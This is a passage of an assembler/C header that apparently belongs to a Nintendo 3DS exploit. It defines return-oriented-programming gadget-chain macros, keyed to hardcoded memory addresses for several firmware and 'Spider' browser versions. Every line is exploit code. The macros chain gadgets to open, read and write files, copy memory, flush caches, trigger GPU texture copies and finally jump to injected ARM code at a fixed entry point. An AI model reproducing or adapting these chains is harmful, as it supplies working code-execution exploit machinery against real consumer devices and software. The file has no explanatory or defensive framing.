		#define rop_sleep(ns) .word POP_R0_PC, ns, POP_R1_2_3_PC, 0, POP_PC, GARBAGE, POP_R4_LR_BX_R2, GARBAGE, POP_PC, SVC_0A_BX_LR 
	#else
		#define THIS				0x00279000
		#define rop_file_read(handle, readcount, buffer, size) .word POP_R0_R2_PC, handle, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_2_3_PC, readcount, buffer, size, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
		#define rop_file_write(handle, writecount, buffer, size) .word POP_R0_R2_PC, handle, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_2_3_PC, writecount, buffer, size, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
		#define rop_memcpy(dst, src, size) .word POP_R0_R2_PC, dst, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_2_3_PC, src, size, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
		#define rop_sleep(ns) .word POP_R0_R2_PC, ns, POP_PC, POP_R4_LR_BX_R2, GARBAGE, POP_PC, POP_R1_PC, 0, SVC_0A_BX_LR 
	#endif
#else //Spider
	#define CODE_ENTRY			0x009D2000
	#define THIS				0x0978CC00
	#ifndef CODE_TARGET
		#define CODE_TARGET			0x19592000
	#endif
	//#define THIS				0x08F10000
	#ifndef ROP_LOC
		#if (defined(SPIDER_42_CN) || defined(SPIDER_45_CN) || defined(SPIDER_5X_CN) || defined(SPIDER_9X_CN))
			#define ROP_LOC				0x08CC0000
		#else
			#define ROP_LOC				0x08CD0000
		#endif
	#endif
	#define BUFFER_LOC			0x18410000
	#define rop_flush_data_cache(buffer, size) .word POP_LR_PC, POP_PC, POP_R0_PC, HANDLE_PTR, POP_R1_2_3_PC, KPROCESS_HANDLE, buffer, size, GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC
	#define rop_fs_mount(drive)		.word POP_LR_PC, POP_PC, POP_R0_PC, drive, FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC
	#define rop_sleep(ns)			.word POP_LR_PC, POP_PC, POP_R0_PC, ns, POP_R1_PC, 0, SVC_0A_BX_LR
	#define rop_memcpy(dst, src, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, dst, POP_R1_2_3_PC, src, size, GARBAGE, MEMCPY_LDMFD_SP_R4_5_6_7_8_9_10_LR
	#define rop_file_read(handle, readcount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, readcount, buffer, size, IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC
	#define rop_file_write(handle, writecount, buffer, size)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, writecount, buffer, size, IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC
	#if defined(SPIDER_4X)
		#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, ROP_LOC+filename, mode, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_PC
	#else
		#define rop_file_open(handle, filename, mode)	.word POP_LR_PC, POP_PC, POP_R0_PC, handle, POP_R1_2_3_PC, ROP_LOC+filename, mode, GARBAGE, IFile_Open_LDMFD_SP_R4_5_6_7_8_PC
	#endif
#endif
#define JOIN(a,b)	a##b
#define LABEL(a)	JOIN(loc_, a)
#define LINE_LABEL	LABEL(__LINE__)
#if defined(SPIDER_4X)
	#define rop_gx_texture_copy(src, dst, size)	LINE_LABEL:	.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+LINE_LABEL+0x14, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_PC + 4, GX_SetTextureCopy, src, dst, (size+0xF)&~0xF, 0xFFFFFFFF, POP_R0_PC, 0x00000008
#else
	#define rop_gx_texture_copy(src, dst, size)	LINE_LABEL:	.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58, POP_R1_PC, ROP_LOC+LINE_LABEL+0x14, nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue_LDMFD_SP_R4_5_6_7_8_9_10_PC + 4, GX_SetTextureCopy, src, dst, (size+0xF)&~0xF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008
#endif
#define rop_jump(address)		.word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, address-4, SP_LR_LDMFD_SP_LR_PC
#define rop_jump_arm			.word CODE_ENTRY
#define rop_store(addr, val)		.word POP_R0_PC, addr, POP_R1_PC, val, STR_R1_0_POP_R4_PC, GARBAGE
